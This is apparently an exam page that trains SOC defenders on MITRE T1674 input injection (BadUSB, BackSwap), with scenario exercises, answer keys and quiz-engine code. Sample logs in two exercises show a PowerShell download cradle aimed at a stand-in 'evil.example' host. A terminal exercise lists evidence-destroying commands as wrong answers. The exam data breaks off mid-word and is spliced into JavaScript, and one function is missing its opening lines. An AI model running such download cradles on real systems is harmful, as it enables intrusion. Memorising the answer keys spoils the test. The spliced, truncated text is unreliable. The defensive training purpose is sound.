<script>
window.__EXAM_DATA__ = {"meta":{"topicId":"t1674","batch":4,"title":"T1674 Input Injection — EXTREMELY HARD","difficulty":"extremely-hard","questionCount":11,"estimatedMinutes":40,"passMark":70},"techniqueId":"T1674","techniqueName":"Input Injection","objectTypeLabel":"ATT&CK TECHNIQUE","tactic":"Execution (TA0002)","platforms":"Windows, Linux, macOS","severity":{"key":"xhard","digit":"4","label":"EXTREMELY HARD","short":"X","color":"#ef4444"},"timerSec":2400,"introHTML":"\n<h3>You will learn about Input Injection<\/h3>\n<p><b>What kind of ATT&amp;CK object is this?<\/b> T1674 — Input Injection is a <b>Technique<\/b>. In MITRE ATT&amp;CK, a technique describes <i>one concrete way attackers act<\/i>. It is not a product and not a crime group. It is a behaviour that any attacker can use on any of the listed platforms. This page is the parent page of the technique in the Enterprise matrix, and it has no sub-techniques.<\/p>\n<p><b>What does it mean?<\/b> Imagine someone makes your computer believe that keys were pressed on the keyboard — but nobody typed. That is input injection. The fake keystrokes can open the command interpreter with a keyboard shortcut, type a whole inline script that then runs, or interact with a GUI application like a real user. These actions can live inside attacker tooling or come from a physical device — a Human Interface Device (HID), which is the device class that keyboards and mice belong to. The computer runs those actions <b>as you<\/b>, the logged-in user, with your rights. The attacker does not need admin rights to start.<\/p>\n<p><b>Two real examples worth remembering.<\/b> First, the BackSwap banking trojan (2018) used tooling that watched the Windows message loop — the queue that carries every key press and click. When the user opened a bank-specific URL, it simulated keystrokes to open the developer console or select the address bar, pasted malicious JavaScript from the clipboard, and executed it. The bank page could then be manipulated — for example, replacing bank account numbers during a transaction. Second, the FIN7 crime group used malicious USB devices that emulated keystrokes to launch PowerShell, leading to the download and execution of malware from adversary-controlled servers — USBs even mailed to companies as gifts. No file was opened; the \"keyboard\" did the work.<\/p>\n<p><b>Where it sits in the attack.<\/b> T1674 belongs to the <b>Execution tactic (TA0002)<\/b> — the stage where attacker code starts to run on a machine. Often the device itself arrives as <b>Initial Access<\/b> (for example T1200 Hardware Additions: someone plugs the device in). Then the injected keystrokes fire, and what they launch — very often a shell such as PowerShell or bash (T1059, Command and Scripting Interpreter) — does the rest of the attack.<\/p>\n<p><b>Where you will use this at work:<\/b><\/p>\n<div class=\"wgrid\">\n<div class=\"wcell\"><b>SOC analyst<\/b>Triage device-install alerts. A \"new keyboard\" that appears and is followed seconds later by a script is your loudest signal.<\/div>\n<div class=\"wcell\"><b>Threat hunter<\/b>Hunt for HID enumeration followed by unattended command execution. Check input timing against user activity.<\/div>\n<div class=\"wcell\"><b>Incident responder<\/b>Preserve device evidence first, contain the host second, and keep the business running where you can.<\/div>\n<div class=\"wcell\"><b>CTI analyst<\/b>Brief leaders on FIN7-style BadUSB campaigns and write ATT&amp;CK-mapped reports naming T1674, DET0568, M1034 and M1038.<\/div>\n<div class=\"wcell\"><b>Detection engineer<\/b>Build and tune the analytics of detection strategy DET0568 — AN1567 (Windows), AN1568 (Linux), AN1569 (macOS) — and cut false positives from docks, KVM switches and scanners.<\/div>\n<div class=\"wcell\"><b>Red teamer<\/b>Use HID emulators in authorized physical tests, then document why the path worked and what would have caught it.<\/div>\n<div class=\"wcell\"><b>GRC / control owner<\/b>Own M1034 (limit hardware installation: device-install policy, port controls) and M1038 (execution prevention: script control such as PowerShell Constrained Language Mode, which restricts dangerous elements like Add-Type).<\/div>\n<\/div>\n<p style=\"margin-top:10px\"><b>What risks does it address?<\/b> Actions that look exactly like trusted user work; payment pages changed inside the browser; malware \"typed\" onto a machine by a device; and the hard truth that blocking USB storage alone does not stop it, because the malicious device claims to be a keyboard, not a disk.<\/p>\n<div class=\"arte\" style=\"margin-top:12px\"><div class=\"arte-t\">THIS TIER<\/div><div class=\"arte-b\">This EXTREMELY HARD tier mirrors senior-level decisions: chained evidence, conflicting signals, real costs, and at least one moment where the best move is to wait and gather evidence.<\/div><\/div>","rulesHTML":"\n<h3>How this exam works<\/h3>\n<ul class=\"rules\">\n<li><b>Goal:<\/b> master T1674 — Input Injection at <b style=\"color:#ef4444\">EXTREMELY HARD<\/b> level. Chained concepts, conflicting signals, noise and gaps in the evidence; some decisions cost the business something, and at least one correct answer is \"do nothing yet\".<\/li>\n<li><b>Passing score:<\/b> 70%. The score is computed only over exercises you actually answer.<\/li>\n<li><b>11 exercises<\/b>, one question per screen. Every screen has three fixed blocks: <b>SCENARIO<\/b>, <b>QUESTION<\/b>, <b>YOUR ANSWER<\/b>. Types in this file: senior triage decisions with conflicting signals, a four-step branching incident, a rich log review with noise and retention gaps, an evidence-first terminal under a reduced timer, coverage-gap analysis, priority ranking, and executive briefing drafting.<\/li>\n<li><b>Timer:<\/b> 40 minutes for the whole file. You can pause — while paused the exercise is hidden and the clock is stopped.<\/li>\n<li><b>Hints:<\/b> one hint per exercise, and it costs 10% of that exercise's points. It nudges you; it never reveals the answer.<\/li>\n<li><b>Skips:<\/b> every exercise has a Skip button and skipping is free. Before you can finish, a \"Review skipped\" screen lets you return to skipped exercises as many times as you want while the timer runs. If you submit with skipped exercises unanswered, they are excluded from the score: not correct, not wrong, and their points are removed from the total.<\/li>\n<li><b>Retake:<\/b> if you fail, retake the exam — the exercise order and all answer choices are reshuffled.<\/li>\n<\/ul>\n","keywords":[{"theme":"Behaviour & Mechanics","chips":[{"t":"keystroke simulation","s":"1234"},{"t":"keyboard-shortcut shell launch","s":"12"},{"t":"inline script typing","s":"2"},{"t":"GUI application interaction","s":"23"},{"t":"acts with the user’s own rights","s":"13"},{"t":"preprogrammed tooling","s":"12"},{"t":"clipboard paste into console","s":"24"},{"t":"browser developer console","s":"23"},{"t":"Windows message loop","s":"23"},{"t":"browser content / account-number swap","s":"2"}]},{"theme":"Devices & Delivery","chips":[{"t":"HID (Human Interface Device)","s":"1234"},{"t":"BadUSB","s":"134"},{"t":"USB keyboard emulation","s":"12"},{"t":"mailed USB social engineering","s":"14"},{"t":"physical access requirement","s":"13"}]},{"theme":"Tactics & Matrix Position","chips":[{"t":"Execution tactic (TA0002)","s":"1234"},{"t":"T1059 Command and Scripting Interpreter as next step","s":"23"},{"t":"T1200 Hardware Additions (arrival)","s":"3"},{"t":"Initial Access vs Execution boundary","s":"3"}]},{"theme":"Platforms & Permissions","chips":[{"t":"Windows","s":"123"},{"t":"Linux","s":"123"},{"t":"macOS","s":"234"},{"t":"no admin rights required","s":"23"},{"t":"user-privilege execution context","s":"13"}]},{"theme":"Data Sources & Telemetry","chips":[{"t":"HID device enumeration events","s":"1234"},{"t":"WinEventLog:System EventCode 2003 (drive/device creation)","s":"23"},{"t":"WinEventLog:Security 4688 process creation","s":"23"},{"t":"PowerShell 4103/4104 script-block logs","s":"234"},{"t":"/sys/bus/usb/devices/ enumeration","s":"123"},{"t":"auditd execve from USB/HID handler","s":"4"},{"t":"ioreg -p IOUSB","s":"24"},{"t":"macOS unified log","s":"4"},{"t":"unattended command execution","s":"234"},{"t":"input timing / no user context","s":"234"}]},{"theme":"Detection Logic & Analytics","chips":[{"t":"DET0568 detection strategy","s":"34"},{"t":"AN1567 (Windows)","s":"234"},{"t":"AN1568 (Linux)","s":"24"},{"t":"AN1569 (macOS)","s":"24"},{"t":"rogue devices presenting as keyboards","s":"13"},{"t":"rapid no-context input sequences","s":"3"},{"t":"scripts executed via simulated keys","s":"3"},{"t":"false-positive sources: docks, KVM, scanners","s":"34"}]},{"theme":"Mitigations & Controls","chips":[{"t":"M1038 Execution Prevention","s":"234"},{"t":"PowerShell Constrained Language Mode","s":"24"},{"t":"Add-Type / Win32 API restriction","s":"24"},{"t":"M1034 Limit Hardware Installation","s":"134"},{"t":"device-install restriction policy","s":"34"},{"t":"browser-path hardening gap","s":"34"}]},{"theme":"Real-World Procedures","chips":[{"t":"FIN7 (G0046) BadUSB campaign","s":"134"},{"t":"BackSwap banking trojan","s":"23"},{"t":"FBI mailed-USB warnings","s":"4"},{"t":"PowerShell downloader payload","s":"123"}]},{"theme":"SOC / IR / CTI Workflow","chips":[{"t":"alert triage & correlation","s":"23"},{"t":"evidence preservation","s":"34"},{"t":"containment with business cost","s":"4"},{"t":"attribution calibration","s":"34"},{"t":"executive ATT&CK briefing","s":"34"}]}],"exercises":[{"id":"X1","type":"qcm","theme":"SOC / IR / CTI Workflow","tag":"Senior triage","persp":"defender","title":"Conflicting signals, 10 minutes","scenario":[{"label":"ARTEFACT 1 — CISO call, 09:12","text":"\"I need a decision in 10 minutes: device telemetry reports a new HID keyboard on 14 finance hosts overnight. What do we do?\""},{"label":"ARTEFACT 2 — EDR console","text":"Zero suspicious process spawns on all 14 hosts in the relevant window. No script blocks, no encoded PowerShell, no new scheduled tasks."},{"label":"ARTEFACT 3 — Badge + facilities","text":"A cleaning contractor was on the floor between 03:00 and 03:40. It is quarter-end close week; isolating finance hosts means stopping the close."}],"summary":"14 hosts report HID keyboards; EDR shows no execution — decide now","question":"What do you recommend right now?","hint":"Before you call something injected, what must be true? Keys alone are the device signal — where is the execution signal?","explain":"Two signals conflict: device telemetry says keyboards appeared; EDR says nothing executed. Input injection needs the execution half to matter, and that half is absent so far. The correct senior move is the least aggressive one: keep hosts online (the close is expensive to stop), pull device plus process telemetry for the exact window, and watch for HID-before-execution correlation. Isolating 14 hosts stops the quarter close for a signal with no execution; declaring false positive ignores a real device signal; reimaging destroys evidence and is indefensible.","study":"Senior triage — resolve conflicting signals; no execution signal, no emergency action.","perspNote":"This is the \"do nothing yet\" decision: acting costs the business, and the evidence does not yet justify the cost.","options":["Declare a false positive because EDR saw no execution","Isolate all 14 finance hosts immediately to stop the risk","Hold: hosts stay online; pull exact-window telemetry first","Reimage the 14 hosts tonight before the next shift"],"correct":[2]},{"id":"X2","type":"branch","theme":"SOC / IR / CTI Workflow","tag":"Incident chain","persp":"defender","title":"The gift box, four steps","scenario":[{"label":"Case opening","text":"A \"thank-you\" gift box with a USB hub arrived by mail at HR. The receptionist plugged it into her laptop for about three minutes before becoming suspicious and unplugging it. She opened a ticket. You lead the response. Decisions branch: each correct move unlocks the next; one wrong move ends the branch."}],"summary":"Four-step branching response to a mailed BadUSB gift","question":"Work the four steps of the response.","hint":"Preserve, scope, contain with proportion, report with calibrated confidence.","explain":"The chain: preserve the device and the logs (never replug \"to see what happens\" — that re-runs the attack); scope across the tenant using proxy and 4688 patterns; contain with proportion (two hosts, mid-payroll — isolate the two, keep payroll on a clean segment); report with calibrated attribution (FIN7-style, moderate confidence). Each step depends on the previous interpretation — that is the branching skill.","study":"IR chain for mailed-BadUSB campaigns — FIN7-style handling end to end.","steps":[{"scenario":[{"label":"STEP 1 — The hub is on your desk","text":"The receptionist handed you the USB hub. Colleagues suggest: \"Plug it into a test laptop to see what it does!\""}],"question":"What is your first forensic step?","options":["Preserve: inventory the hub and capture logs for the exposure window","Replug it into a test laptop to watch its behaviour","Throw the hub away so nobody plugs it again"],"correct":0,"ok":"You preserved the device and the exposure-window logs — evidence first, and no second injection.","bad":"Replugging re-runs the attack and destroys the \"what already happened\" picture; binning it loses the evidence you will need for attribution."},{"scenario":[{"label":"STEP 2 — First findings","text":"PnP logs show three HID keyboard enumerations in the 3-minute window; PowerShell 4104 shows one download attempt to hxxp://evil[.]example/x that the proxy blocked."},{"label":"Scope question","text":"One laptop, three minutes, one blocked download. How wide do you look?"}],"question":"How do you scope the incident?","options":["Treat it as only that one laptop — case closed after a scan","Query proxy and 4688 patterns across the tenant for the same signature","Ask all staff to self-report USB usage by email"],"correct":1,"ok":"You hunted tenant-wide for the same device-then-command pattern — the correct scope for a mailed campaign: multiple recipients are likely.","bad":"Mailed devices go to many recipients; a single-host view misses the campaign. Self-reporting by email is slow, biased, and tips everyone off."},{"scenario":[{"label":"STEP 3 — Second host, business pressure","text":"One more HR host shows the same pattern: HID enumeration then encoded PowerShell, also blocked at the proxy. It is payroll day; HR cannot lose its machines for long."}],"question":"What is the proportional containment move?","options":["Isolate the two hosts, keep payroll running on a clean segment","Shut down the whole HR floor until everything is rebuilt","Do nothing — both downloads were blocked anyway"],"correct":0,"ok":"Proportionate: the two affected hosts are isolated for forensics while payroll continues on a clean segment — cost accepted where needed, not everywhere.","bad":"A floor-wide shutdown is a self-inflicted outage for a blocked-download incident; doing nothing leaves two injected hosts in production."},{"scenario":[{"label":"STEP 4 — Leadership wants a name","text":"The CISO asks: \"Who did this? I want it in the board update in one hour.\" Evidence: mailed gift-box USB, HID enumeration, encoded PowerShell downloader, HR/finance targeting at a US company."}],"question":"Which reporting line is professionally correct?","options":["Confirmed 100% FIN7 insider attack — name them in the update","Matches FIN7 mailed-BadUSB campaigns; moderate confidence","No attribution is ever possible — omit any actor mention"],"correct":1,"ok":"Calibrated: TTP overlap supports a FIN7-style attribution at moderate confidence — honest and useful for leadership.","bad":"Certainty is not evidence, and refusing all attribution hides a documented campaign pattern the board needs for context."}]},{"id":"X3","type":"logview","theme":"Detection Logic & Analytics","tag":"Rich review","persp":"defender","title":"Noise, gaps, and one conclusion","scenario":[{"label":"ARTEFACT 1 — PnP logs, two hosts","text":"HOST-A  22:04:11  EV2003  Install: USB Print Support (HP LaserJet) — driver OK\nHOST-B  22:06:43  EV2003  Install: USB Input Device (HID keyboard) — vendor 0x2C0F\nHOST-B  22:06:46  EV4688  New process: powershell.exe -enc AAAAw45J...\nHOST-A  22:07:02  EV2003  Install: USB Printing Support queue restart"},{"label":"ARTEFACT 2 — PowerShell script block (HOST-B)","text":"EV4104  ScriptBlock: IEX (New-Object Net.WebClient).DownloadString(\"hxxp://evil[.]example/x\") — network error, no bytes received"},{"label":"ARTEFACT 3 — Proxy log note","text":"Retention: proxy logs kept 7 days, then overwritten. No hit for evil[.]example for HOST-B in the retained window. Older windows no longer available."},{"label":"ARTEFACT 4 — Badge","text":"Both hosts: users badged out at 18:05. Building empty after 18:30."},{"label":"ARTEFACT 5 — Facilities noise","text":"22:01:55  UPS battery test started (both floors)\n22:03:10  Printer driver push from print server (HOST-A)"}],"summary":"Five artefacts with noise and a retention gap — conclude","question":"Which conclusion and next action is best supported?","hint":"Absence in a 7-day proxy log is weak evidence. Presence in device logs at an empty-building hour is strong. Weigh them.","explain":"HOST-B shows the full signature: HID keyboard install, encoded PowerShell three seconds later, at 22:06 while the building was empty — while HOST-A's events are printer noise and a UPS test (irrelevant but realistic). The proxy \"no hit\" is weak because logs expire after 7 days — incomplete information, not proof of innocence. Best move: treat HOST-B as likely injection, preserve what exists, and extend retention/pull EDR and switch data now. Waiting for archives that no longer exist, or closing on the printer noise, both fail the weighting.","study":"Correlation under noise and retention gaps — weight device signals over absent logs.","log":{"title":"Consolidated view (all artefacts)","lines":[{"t":"22:01:55  UPS battery test started (both floors)","cls":"info"},{"t":"22:03:10  Printer driver push from print server (HOST-A)","cls":"info"},{"t":"22:04:11  HOST-A  EV2003  Install: USB Print Support (HP LaserJet)","cls":"info"},{"t":"22:06:43  HOST-B  EV2003  Install: USB Input Device (HID keyboard) — vendor 0x2C0F","cls":"warn"},{"t":"22:06:46  HOST-B  EV4688  New process: powershell.exe -enc AAAAw45J...","cls":"crit"},{"t":"22:06:47  HOST-B  EV4104  ScriptBlock: DownloadString(\"hxxp://evil[.]example/x\") — network error","cls":"crit"},{"t":"(proxy) no hit for evil[.]example in retained 7-day window","cls":"warn"},{"t":"18:05  Badge-out: both users left the building","cls":"info"}]},"answer":{"kind":"qcm","options":["Wait for the 90-day archive to appear before acting","The printer driver push caused every event; close the case","HOST-B is clean because the proxy shows no malicious hit","HOST-B: likely injection — extend retention, add sources now"],"correct":[3]}},{"id":"X4","type":"terminal","theme":"Data Sources & Telemetry","tag":"Evidence terminal","persp":"defender","title":"Capture evidence, touch nothing","scenario":[{"label":"ARTEFACT 1 — Legal hold instruction","text":"\"Evidence must survive scrutiny. Do not change system state. Do not alert the operator. The host stays live.\""},{"label":"ARTEFACT 2 — Host context","text":"CFO workstation, Linux, suspected rogue HID dock. The kernel ring buffer (dmesg) holds the enumeration lines: hid-generic, input events, device-to-host assignments. Your terminal is a live session on the host."},{"label":"ARTEFACT 3 — Task","text":"Capture the kernel log lines to a file as evidence. Reduced timer: 90 seconds from your first command. Choose the tool, the redirection, and — above all — what NOT to run."}],"summary":"Terminal — capture kernel evidence safely under a reduced timer","question":"Type the single safe command that writes the kernel log to an evidence file.","hint":"Read-only capture, written to a file. Nothing that clears a buffer, unloads a driver, or writes into /sys.","explain":"Canonical command: dmesg > /tmp/usb_evidence.log\n\ndmesg — reads the kernel ring buffer (the enumeration lines). > /tmp/usb_evidence.log — writes a durable copy for the evidence file. It changes no system state and alerts nobody. The near-misses are the teaching point: dmesg alone prints to the screen only (not durable — \"survive scrutiny\" fails); dmesg -C CLEARS the buffer and destroys evidence; echo 0 > .../authorized changes device state and can alert the operator; rmmod usbhid unloads the driver and kills the live behaviour evidence. Safe command, correct order, right reason — that is the senior judgement.","study":"Evidence-first command choice — read-only capture vs state-changing or destructive commands.","os":"Linux — bash (live host, evidence session)","prompt":"root@cfo-ws:~#","banner":"Evidence session — every command here is judged. Choose the safe one.","timeLimit":90,"accepted":[{"re":"^dmesg\\s*>\\s*/tmp/[\\w.\\-]+\\.log$","ok":true,"out":"(kernel ring buffer written to /tmp/usb_evidence.log) [22:06:43] usb 1-2: new high-speed USB device\n[22:06:43] input: Generic Keyboard as /devices/pci0000:00/0000:1-2/.../input/input12\n[22:06:43] hid-generic 0003:2C0F:0001.0004: input device attached"},{"re":"^dmesg\\s*\\|\\s*tee\\s+/tmp/[\\w.\\-]+\\.log$","ok":true,"out":"[22:06:43] usb 1-2: new high-speed USB device\n[22:06:43] input: Generic Keyboard as /devices/.../input/input12\n(and the same lines written to /tmp — durable copy created)"},{"re":"^dmesg\\s+(-c\\b|--read-clear\\b)","ok":false,"danger":true,"out":"(kernel ring buffer CLEARED) — the enumeration lines are gone. Evidence destroyed."},{"re":"^dmesg\\s+-(?!c\\b)[a-z]+\\s*>\\s*/tmp/[\\w.\\-]+\\.log$","ok":true,"out":"(kernel ring buffer written to /tmp/usb_evidence.log, human-readable timestamps)\n[22:06:43] usb 1-2: new high-speed USB device\n[22:06:43] input: Generic Keyboard as /devices/.../input/input12\n[22:06:43] hid-generic 0003:2C0F:0001.0004: input device attached"},{"re":"^dmesg$","ok":false,"out":"[22:06:43] usb 1-2: new high-speed USB device\n[22:06:43] input: Generic Keyboard as /devices/.../input/input12\n(printed to screen only — nothing durable. \"Survives scrutiny\" fails.)"},{"re":"^dmesg\\s*-c$","ok":false,"danger":true,"out":"(kernel ring buffer CLEARED) — the enumeration lines are gone. Evidence destroyed."},{"re":"^echo\\s+0\\s*>\\s*/sys/bus/usb/devices/[\\w.\\-]+/authorized$","ok":false,"danger":true,"out":"(device deauthorized) — you changed system state; the operator's dock just stopped working. They will notice."},{"re":"^rmmod\\s+usbhid$","ok":false,"danger":true,"out":"(usbhid unloaded) — the injected keystrokes stop, the live behaviour evidence is destroyed, and the user sees their keyboard die."}],"canonical":"dmesg > /tmp/usb_evidence.log"},{"id":"X5","type":"qcm","theme":"Mitigations & Controls","tag":"Best practice trap","persp":"defender","title":"The covered stamp","scenario":[{"label":"ARTEFACT 1 — Audit line","text":"Control audit, item 14: \"USB mass storage is blocked by DLP on all endpoints. Input Injection (T1674): covered.\""},{"label":"ARTEFACT 2 — Reality check","text":"A test device claims to be a HID keyboard. It installs without touching the storage class. It types PowerShell in four seconds."}],"summary":"DLP blocks USB storage — is T1674 really covered?","question":"Why is that \"covered\" stamp wrong?","hint":"What device class does the malicious device claim to be?","explain":"Blocking USB mass storage controls the storage class only. A BadUSB presents as a HID keyboard — a different device class that storage blocking never inspects. Real coverage for T1674 needs class-level device-install limits (M1034) plus behavioural detection (AN1567-style). \"Keyboards cannot run commands\" is the false assumption the whole technique exploits; the other options grant DLP powers it does not have.","study":"M1034 scope — device-class control, not storage-only blocking.","options":["Storage blocking covers keyboards too after every reboot","DLP also inspects every keystroke by default on endpoints","Storage blocking never sees the HID keyboard class it claims","Keyboards cannot really execute commands on Windows builds"],"correct":[2]},{"id":"X6","type":"multi","theme":"Mitigations & Controls","tag":"Coverage gap","persp":"defender","title":"What stays uncovered","scenario":[{"label":"ARTEFACT 1 — Deployed controls","text":"Org-wide: M1034 HID device-install blocklist (unapproved keyboards cannot install), AN1567/AN1568/AN1569 behavioral analytics live on Windows/Linux/macOS, M1038 with PowerShell CLM on user hosts."},{"label":"ARTEFACT 2 — Threat model question","text":"Your detection engineering lead asks: which T1674 variants are LEAST covered by this stack? Select TWO."}],"summary":"Strong hardware path — which two paths stay least covered?","question":"Which TWO T1674 paths remain least covered?","hint":"Both remaining paths need NO new USB device at all.","explain":"The stack attacks the hardware path: unapproved HID devices cannot install, and all three analytics watch device enumeration. What remains: software-only keystroke simulation by malware already running (no device signal exists to see), and the browser message-loop console path (BackSwap-style) where the only artifacts are inside the browser. Both need behavioural/browser telemetry instead. The two wrong options are the USB paths the stack deliberately covers.","study":"Coverage gaps — software injection and browser-path injection vs device analytics.","options":["BadUSB typing PowerShell on a locked-down Windows host","Software-only keystroke simulation by a running infostealer","A rogue USB keyboard on Linux watched by AN1568","In-browser message-loop console injection from local tooling"],"correct":[1,3]},{"id":"X7","type":"match","theme":"Detection Logic & Analytics","tag":"Analytics map","persp":"defender","title":"Analytics to platforms to signals","scenario":[{"label":"Detection catalogue task","text":"Three analytics of DET0568 must be pinned into the catalogue with platform and signature. Pair each analytic ID with its full line. One right-side card is a decoy."}],"summary":"Pin each analytic to platform and signature; one decoy","question":"Match each analytic to its platform-and-signature line.","hint":"Match folders and log channels first: /sys is Linux, EventCode 2003 is Windows, ioreg is macOS.","explain":"AN1567 — Windows: device installs (EventCode 2003) joined with process creation 4688 and PowerShell 4103–4106 script blocks. AN1568 — Linux: /sys/bus/usb/devices/ enumeration plus auditd execve where the parent is the USB/HID handler. AN1569 — macOS: ioreg -p IOUSB enumeration plus osascript/AppleScript execution right after HID connection — the macOS unified log supplies that execution half. The decoy (sysmon Event ID 1) is real telemetry in real SOCs but is not part of DET0568's listed sources.","study":"DET0568 — per-OS log sources of AN1567/AN1568/AN1569.","left":["AN1567","AN1568","AN1569"],"right":["Windows — EventCode 2003 + 4688 + PowerShell 4103-4106","Linux — /sys/bus/usb/devices/ + auditd execve from the HID handler","macOS — ioreg -p IOUSB + osascript right after HID connection","Windows — Sysmon Event ID 1 with script-block hashing"],"pairs":[[0,0],[1,1],[2,2]]},{"id":"X8","type":"order","theme":"SOC / IR / CTI Workflow","tag":"Costed sequencing","persp":"defender","title":"Sequence with a price tag","scenario":[{"label":"ARTEFACT 1 — Confirmed case","text":"Confirmed: rogue HID dock on the CFO workstation, quarter-end close week. Injection ran; payload blocked by CLM. Leadership accepts downtime ONLY where justified."},{"label":"ARTEFACT 2 — The five actions","text":"A. Snapshot volatile device/kernel evidence.\nB. Isolate the CFO host.\nC. Notify legal/compliance and start evidence custody.\nD. Sweep peer finance hosts for the same device signature.\nE. Deploy M1034 device-class restrictions org-wide."}],"summary":"Order five actions where step two costs the business","question":"Put the five actions in the order that respects evidence, cost, and widening scope.","hint":"Evidence first; the costly isolation second; legal before anything touches the wider estate; hardening last.","explain":"Order: snapshot volatile evidence (A) — the only unrepeatable step; isolate the CFO host (B) — accepted business cost now justified by confirmation; notify legal/compliance (C) — custody and disclosure duties start before you widen; sweep peer finance hosts (D) — find siblings of the same signature; deploy M1034 org-wide (E) — hardening last, once the case is understood. Hardening first wastes budget before the case is scoped; legal after a sweep risks custody disputes.","study":"Senior IR sequencing — evidence, contained cost, legal, scope, hardening.","items":["Snapshot volatile device/kernel evidence","Isolate the CFO host","Notify legal/compliance and start evidence custody","Sweep peer finance hosts for the same device signature","Deploy M1034 device-class restrictions org-wide"],"mode":"steps"},{"id":"X9","type":"fill","theme":"Real-World Procedures","tag":"Executive briefing","title":"Fill the exec brief","scenario":[{"label":"Executive brief (gaps)","text":"You draft the one-paragraph executive brief after the campaign closes. Seven gaps; the bank holds two decoy words. Leadership reads this — precision is everything."}],"summary":"Fill seven keywords in the executive brief","question":"Fill the seven gaps in the executive brief.","hint":"Four IDs are alphanumeric — one T-, one DET-, and two M-IDs; the tactic is where code starts to run; the device pretends to be a keyboard.","explain":"The brief reads: technique T1674 (Execution); style matches FIN7 mailed-BadUSB activity; detection strategy DET0568 on all three OSes; quick wins M1034 devi 'use strict';
/* ---------- utils ---------- */
function $(id){return document.getElementById(id);}
function el(tag,cls,html){var e=document.createElement(tag);if(cls)e.className=cls;if(html!==undefined&&html!==null)e.innerHTML=html;return e;}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function shuffle(a){var r=a.slice();for(var i=r.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=r[i];r[i]=r[j];r[j]=t;}return r;}
function reducedMotion(){return window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;}
function letters(i){return String.fromCharCode(65+i);}
function normCmd(c){return String(c||'').replace(/\s+/g,' ').trim().toLowerCase();}
function ptext(s){return esc(s).replace(/\n/g,'<br>');}

/* ---------- data & state ---------- */
var D = window.__EXAM_DATA__;
var S = {
  phase:'intro', order:[], idx:0, widgets:{}, work:{},
  timeLeft:D.timerSec, timerId:null, paused:false,
  fromReview:false, reported:false, learner:''
};
function res(id){
  if(!S.work[id]) S.work[id]={status:null,frac:0,awarded:0,hintUsed:false,submitted:false,viewed:false};
  return S.work[id];
}
function answeredList(){
  return S.order.map(function(i){return D.exercises[i];}).filter(function(ex){var r=S.work[ex.id];return r&&(r.status==='correct'||r.status==='partial'||r.status==='wrong');});
}
function skippedList(){
  return S.order.map(function(i){return D.exercises[i];}).filter(function(ex){var r=S.work[ex.id];return r&&r.status==='skipped';});
}
function earnedPoints(){var n=0;answeredList().forEach(function(ex){n+=S.work[ex.id].awarded;});return n;}
function possiblePoints(){return answeredList().length*10;}
function liveScore(){return earnedPoints();}

/* ---------- header ---------- */
function renderHeader(){
  var tb=$('topbar');tb.innerHTML='';
  var row=el('div','row');
  var brand=el('div','brand','<span class="tid">'+esc(D.meta.topicId.toUpperCase())+'</span> '+esc(D.techniqueName));
  row.appendChild(brand);
  var sev=el('span','pill sev','<span style="width:9px;height:9px;border-radius:99px;display:inline-block;background:'+D.severity.color+'"></span> '+esc(D.severity.label));
  row.appendChild(sev);
  var count=el('span','hstat','',null);
  if(S.phase==='exam'){
    count.innerHTML='Exercise <b>'+(S.idx+1)+' of '+S.order.length+'</b>';
  } else if(S.phase==='review'){
    count.innerHTML='<b>Review skipped</b> — '+skippedList().length+' waiting';
  } else if(S.phase==='results'){
    count.innerHTML='<b>Results</b>';
  } else {count.innerHTML='<b>Intro</b>';}
  row.appendChild(count);
  var timer=el('span','hstat','&#9202; <b id="clock">'+fmtTime(S.timeLeft)+'</b>');
  row.appendChild(timer);
  var score=el('span','hstat','Score <b id="scorelive">'+liveScore()+' pts</b>');
  row.appendChild(score);
  var gap=el('span','');gap.style.flex='1';row.appendChild(gap);
  if(S.phase==='exam'){
    var ex=cur();
    var hb=el('button','hbtn warnb','&#128161; Hint &minus;10%');
    var r=res(ex.id);
    hb.disabled=(r.hintUsed||r.submitted);
    hb.addEventListener('click',function(){useHint(ex);});
    row.appendChild(hb);
    var sb=el('button','hbtn skipb','&#9888; Skip');
    sb.disabled=r.submitted;
    sb.addEventListener('click',function(){skipCurrent(ex);});
    row.appendChild(sb);
    var pb=el('button','hbtn',(S.paused?'\u25B6 Resume':'\u23F8 Pause'));
    pb.addEventListener('click',function(){togglePause();});
    row.appendChild(pb);
  }
  tb.appendChild(row);
  var pbw=el('div','');pbw.id='pbar';
  var pf=el('div','');pf.id='pfill';
  pf.style.background='linear-gradient(90deg,'+D.severity.color+',#38bdf8)';
  var done=answeredOrSkippedCount();
  var frac=S.order.length? (done/S.order.length):0;
  if(S.phase==='results')frac=1;
  pf.style.width=Math.round(frac*100)+'%';
  pbw.appendChild(pf);tb.appendChild(pbw);
}
function answeredOrSkippedCount(){return S.order.filter(function(i){var r=S.work[D.exercises[i].id];return r&&r.status;}).length;}
function fmtTime(s){var m=Math.floor(s/60),ss=s%60;return (m<10?'0':'')+m+':'+(ss<10?'0':'')+ss;}
function tick(){
  if(S.paused)return;
  S.timeLeft--;
  var c=$('clock');if(c)c.textContent=fmtTime(Math.max(0,S.timeLeft));
  if(S.timeLeft<=0){stopTimer();finishExam(true);}
}
function startTimer(){stopTimer();S.timerId=setInterval(tick,1000);}
function stopTimer(){if(S.timerId){clearInterval(S.timerId);S.timerId=null;}}
function togglePause(){
  S.paused=!S.paused;
  if(S.paused){
    var ov=el('div','pauseov');
    ov.innerHTML='<h2>&#9208; Timer paused</h2><p class="mut">The exercise is hidden while you take a break.<br>The clock is stopped. Nothing is graded.</p>';
    var b=el('button','mainbtn','\u25B6 Resume exam');
    b.addEventListener('click',function(){togglePause();});
    ov.appendChild(b);ov.id='pauseov';
    document.body.appendChild(ov);
    $('stage').style.visibility='hidden';
  } else {
    var o=$('pauseov');if(o)o.remove();
    $('stage').style.visibility='';
  }
  renderHeader();
}

/* ---------- hint ---------- */
function useHint(ex){
  var r=res(ex.id);
  if(r.hintUsed||r.submitted)return;
  r.hintUsed=true;
  var box=$('hintarea-'+ex.id);
  if(box){box.style.display='';box.innerHTML='<b>Hint:</b> '+ptext(ex.hint);}
  toast('Hint used — this exercise is now worth at most 9 of 10 points');
  renderHeader();
}
function toast(msg){
  var t=el('div','toast',esc(msg));t.id='toast';
  document.body.appendChild(t);
  setTimeout(function(){var x=$('toast');if(x)x.remove();},2600);
}

/* ---------- exercise frame ---------- */

function scenarioHTML(ex,panels){

    h+='<div class="arte"><div class="arte-t">'+esc(p.label)+'</div><div class="arte-b">'+ptext(p.text)+'</div></div>';
  });
  return h;
}
